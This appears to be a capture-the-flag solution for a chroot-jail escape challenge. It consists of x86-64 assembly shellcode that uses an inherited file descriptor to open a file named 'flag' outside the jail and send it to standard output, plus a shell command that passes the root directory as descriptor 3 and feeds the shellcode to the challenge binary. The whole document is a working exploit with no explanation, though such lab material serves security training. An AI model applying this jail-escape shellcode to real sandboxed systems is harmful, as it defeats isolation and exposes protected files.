.global _start
_start:
.intel_syntax noprefix
        mov rax, 0x101 #syscall OPENAT
        mov rdi, 3
        lea rsi, [rip+flag]
        mov rdx, 0
        syscall

        mov rsi, rax
        mov rax, 0x28
        mov rdi, 1
        mov rdx, 0
        mov r10, 0x300
        syscall
        
    flag:
        .ascii "flag\0"




+ additional bash file to redriect root directory to 3 fd
/challenge/babyjail_level8 0 < shellcode-raw 3</
